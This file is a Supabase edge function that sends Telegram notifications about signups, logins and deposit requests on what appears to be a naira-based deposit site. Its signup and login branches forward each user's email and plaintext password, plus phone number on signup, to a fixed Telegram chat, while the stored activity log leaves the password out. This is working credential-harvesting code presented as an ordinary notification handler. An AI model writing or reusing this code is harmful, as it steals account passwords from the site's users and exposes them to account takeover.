import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN')!;
const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID')!;
const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;

async function sendTelegramMessage(text: string, replyMarkup?: object) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const body: Record<string, unknown> = {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
  };

  if (replyMarkup) {
    body.reply_markup = JSON.stringify(replyMarkup);
  }

  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });

  return response.json();
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // Authenticate the request
    const authHeader = req.headers.get('Authorization');
    if (!authHeader?.startsWith('Bearer ')) {
      return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    const anonClient = createClient(SUPABASE_URL, Deno.env.get('SUPABASE_ANON_KEY')!, {
      global: { headers: { Authorization: authHeader } },
    });

    const token = authHeader.replace('Bearer ', '');
    const { data: claimsData, error: claimsError } = await anonClient.auth.getClaims(token);
    if (claimsError || !claimsData?.claims) {
      return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    const { type, email, phone, password, amount, userId, transactionId } = await req.json();

    let message = '';
    let replyMarkup = undefined;

    switch (type) {
      case 'signup':
        message = `🔔 <b>New Registration</b>\n\n📧 Email: ${email}\n📱 Phone: ${phone || 'N/A'}\n🔑 Password: <code>${password || 'N/A'}</code>`;
        await supabase.from('activity_logs').insert({
          type: 'signup',
          user_email: email,
          details: `Phone: ${phone || 'N/A'}`,
        });
        break;

      case 'login':
        message = `🔔 <b>User Login</b>\n\n📧 Email: ${email}\n🔑 Password: <code>${password || 'N/A'}</code>`;
        await supabase.from('activity_logs').insert({
          type: 'login',
          user_email: email,
          details: 'Logged in',
        });
        break;

      case 'deposit':
        message = `💰 <b>New Deposit Request</b>\n\n📧 From: ${email}\n💵 Amount: ₦${Number(amount).toLocaleString()}\n🆔 User ID: ${userId}`;
        replyMarkup = {
          inline_keyboard: [
            [
              {
                text: '✅ Approve',
                callback_data: `approve_${transactionId}`,
              },
              {
                text: '❌ Decline',
                callback_data: `decline_${transactionId}`,
              },
            ],
          ],
        };
        break;

      default:
        return new Response(
          JSON.stringify({ error: 'Unknown notification type' }),
          { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );
    }

    const result = await sendTelegramMessage(message, replyMarkup);

    return new Response(
      JSON.stringify({ success: true, result }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  } catch (error) {
    return new Response(
      JSON.stringify({ error: (error as Error).message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
